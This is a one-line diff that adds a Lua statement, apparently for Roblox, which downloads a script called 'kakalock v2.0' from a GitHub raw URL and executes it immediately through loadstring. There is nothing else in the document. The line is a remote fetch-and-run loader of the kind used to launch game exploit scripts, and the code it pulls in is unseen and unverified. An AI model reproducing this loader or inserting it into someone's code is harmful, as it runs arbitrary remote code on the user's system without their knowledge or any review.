@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BebrikAU/kakalock/refs/heads/main/kakalock%20v2.0"))()
